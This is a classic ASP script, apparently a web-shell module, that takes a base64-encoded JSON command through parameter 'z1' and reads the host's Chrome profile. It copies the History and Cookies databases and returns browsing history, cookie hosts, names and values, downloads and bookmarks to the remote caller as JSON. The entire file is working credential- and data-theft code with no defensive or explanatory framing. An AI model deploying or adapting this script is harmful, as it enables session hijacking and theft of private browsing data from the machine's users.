<%

Response.ContentType = "text/plain"
Response.Charset = "utf-8"

On Error Resume Next

Dim chromeBase, profileDir, chromeDir
chromeBase = ""
profileDir = "Default"

Function Base64Decode(b64)
    Dim dom, elem, stream
    Set dom = Server.CreateObject("MSXML2.DOMDocument")
    Set elem = dom.createElement("b64")
    elem.dataType = "bin.base64"
    elem.text = b64
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write elem.nodeTypedValue
    stream.Position = 0
    stream.Type = 2
    stream.Charset = "utf-8"
    Base64Decode = stream.ReadText
    stream.Close
End Function

Function ExtractJSONValue(jsonStr, key)
    Dim re, matches
    Set re = New RegExp
    re.Pattern = """" & key & """:\s*""(.*?)"""
    re.IgnoreCase = True
    Set matches = re.Execute(jsonStr)
    If matches.Count > 0 Then
        ExtractJSONValue = matches(0).SubMatches(0)
    Else
        ExtractJSONValue = ""
    End If
End Function

Function DoInit()
    Dim shell, appdata
    Set shell = Server.CreateObject("WScript.Shell")
    appdata = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
    
    If appdata = "" Or appdata = "%LOCALAPPDATA%" Then
        appdata = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local"
    End If
    
    If appdata = "" Then
        DoInit = False
        Exit Function
    End If
    
    chromeBase = appdata & "\Google\Chrome\User Data"
    
    Dim fso
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    DoInit = fso.FolderExists(chromeBase)
End Function

Function EscapeJSON(str)
    If IsNull(str) Then
        EscapeJSON = ""
        Exit Function
    End If
    Dim s
    s = CStr(str)
    s = Replace(s, "\", "\\")
    s = Replace(s, """", "\""")
    s = Replace(s, vbCrLf, "\n")
    s = Replace(s, vbCr, "\n")
    s = Replace(s, vbLf, "\n")
    EscapeJSON = s
End Function

Function DumpHistory()
    Dim fso, historyFile, dst, tempDir, connStr, conn, rs, items, count
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    
    historyFile = chromeDir & "\History"
    If Not fso.FileExists(historyFile) Then
        DumpHistory = "[]"
        Exit Function
    End If
    
    tempDir = fso.GetSpecialFolder(2).Path
    dst = tempDir & "\" & fso.GetTempName()
    fso.CopyFile historyFile, dst, True
    
    connStr = "DRIVER=SQLite3 ODBC Driver;Database=" & dst & ";"
    Set conn = Server.CreateObject("ADODB.Connection")
    conn.Open connStr
    
    items = ""
    count = 0
    
    If conn.State = 1 Then
        Set rs = conn.Execute("SELECT url, title, last_visit_time FROM urls")
        Dim arr()
        Do While Not rs.EOF
            ReDim Preserve arr(count)
            arr(count) = "{""URL"":""" & EscapeJSON(rs("url")) & """,""Title"":""" & EscapeJSON(rs("title")) & """,""LastUsed"":" & rs("last_visit_time") & "}"
            count = count + 1
            rs.MoveNext
        Loop
        rs.Close
        conn.Close
        
        If count > 0 Then
            items = "[" & Join(arr, ",") & "]"
        End If
    End If
    
    If fso.FileExists(dst) Then fso.DeleteFile dst, True
    
    If items = "" Then items = "[]"
    DumpHistory = items
End Function

Function DumpCookie()
    Dim fso, cookieFile, dst, tempDir, connStr, conn, rs, items, count
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    
    cookieFile = chromeDir & "\Network\Cookies"
    If Not fso.FileExists(cookieFile) Then
        cookieFile = chromeDir & "\Cookies"
    End If
    
    If Not fso.FileExists(cookieFile) Then
        DumpCookie = "[]"
        Exit Function
    End If
    
    tempDir = fso.GetSpecialFolder(2).Path
    dst = tempDir & "\" & fso.GetTempName()
    fso.CopyFile cookieFile, dst, True
    
    connStr = "DRIVER=SQLite3 ODBC Driver;Database=" & dst & ";"
    Set conn = Server.CreateObject("ADODB.Connection")
    conn.Open connStr
    
    items = ""
    count = 0
    
    If conn.State = 1 Then
        Set rs = conn.Execute("SELECT host_key, name, value FROM cookies")
        Dim arr()
        Do While Not rs.EOF
            ReDim Preserve arr(count)
            arr(count) = "{""Host"":""" & EscapeJSON(rs("host_key")) & """,""Name"":""" & EscapeJSON(rs("name")) & """,""Value"":""" & EscapeJSON(rs("value")) & """}"
            count = count + 1
            rs.MoveNext
        Loop
        rs.Close
        conn.Close
        
        If count > 0 Then
            items = "[" & Join(arr, ",") & "]"
        End If
    End If
    
    If fso.FileExists(dst) Then fso.DeleteFile dst, True
    
    If items = "" Then items = "[]"
    DumpCookie = items
End Function

Function DumpDownload()
    Dim fso, historyFile, dst, tempDir, connStr, conn, rs, items, count
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    
    historyFile = chromeDir & "\History"
    If Not fso.FileExists(historyFile) Then
        DumpDownload = "[]"
        Exit Function
    End If
    
    tempDir = fso.GetSpecialFolder(2).Path
    dst = tempDir & "\" & fso.GetTempName()
    fso.CopyFile historyFile, dst, True
    
    connStr = "DRIVER=SQLite3 ODBC Driver;Database=" & dst & ";"
    Set conn = Server.CreateObject("ADODB.Connection")
    conn.Open connStr
    
    items = ""
    count = 0
    
    If conn.State = 1 Then
        Set rs = conn.Execute("SELECT target_path, tab_url, total_bytes, start_time FROM downloads")
        Dim arr()
        Do While Not rs.EOF
            ReDim Preserve arr(count)
            arr(count) = "{""FileName"":""" & EscapeJSON(rs("target_path")) & """,""TargetPath"":""" & EscapeJSON(rs("target_path")) & """,""URL"":""" & EscapeJSON(rs("tab_url")) & """,""Length"":" & Clng(rs("total_bytes")) & ",""Date"":""" & EscapeJSON(rs("start_time")) & """}"
            count = count + 1
            rs.MoveNext
        Loop
        rs.Close
        conn.Close
        
        If count > 0 Then
            items = "[" & Join(arr, ",") & "]"
        End If
    End If
    
    If fso.FileExists(dst) Then fso.DeleteFile dst, True
    
    If items = "" Then items = "[]"
    DumpDownload = items
End Function

Function DumpBookmark()
    Dim fso, bookmarkFile, content, re, matches, match, count, arr
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    
    bookmarkFile = chromeDir & "\Bookmarks"
    If Not fso.FileExists(bookmarkFile) Then
        DumpBookmark = "[]"
        Exit Function
    End If
    
    Dim ts
    Set ts = fso.OpenTextFile(bookmarkFile, 1, False, -2) ' Unicode
    content = ts.ReadAll
    ts.Close
    
    Set re = New RegExp
    re.Pattern = """name"":\s*""(.*?)""\s*,\s*""type"":\s*""url""\s*,\s*""url"":\s*""(.*?)"""
    re.IgnoreCase = True
    re.Global = True
    
    Set matches = re.Execute(content)
    count = 0
    Dim items
    items = ""
    
    For Each match in matches
        ReDim Preserve arr(count)
        arr(count) = "{""Name"":""" & EscapeJSON(match.SubMatches(0)) & """,""URL"":""" & EscapeJSON(match.SubMatches(1)) & """}"
        count = count + 1
    Next
    
    If count > 0 Then
        items = "[" & Join(arr, ",") & "]"
    Else
        items = "[]"
    End If
    
    DumpBookmark = items
End Function

Sub Main()
    If Not DoInit() Then
        Response.Write "[-] Initialization failed: " & chromeBase
        Exit Sub
    End If
    
    Dim z1
    z1 = Request.Form("z1")
    If z1 = "" Then
        z1 = Request.QueryString("z1")
    End If
    
    If z1 = "" Then
        Response.Write "[-] Missing parameter z1."
        Exit Sub
    End If
    
    Dim decodedJson
    On Error Resume Next
    decodedJson = Base64Decode(z1)
    If Err.Number <> 0 Or decodedJson = "" Then
        Response.Write "[-] Invalid JSON / Base64."
        Exit Sub
    End If
    
    Dim action, profile
    action = LCase(ExtractJSONValue(decodedJson, "action"))
    profile = ExtractJSONValue(decodedJson, "profile")
    
    If action = "" Then action = "history"
    If profile = "" Then profile = "Default"
    
    chromeDir = chromeBase & "\" & profile
    
    Dim data
    Select Case action
        Case "history"
            data = DumpHistory()
        Case "cookie"
            data = DumpCookie()
        Case "download"
            data = DumpDownload()
        Case "bookmark"
            data = DumpBookmark()
        Case Else
            Response.Write "[-] Unknown action: " & action
            Exit Sub
    End Select
    
    Response.Write "{""status"":""success"",""action"":""" & action & """,""data"":" & data & "}"
End Sub

Main()

%>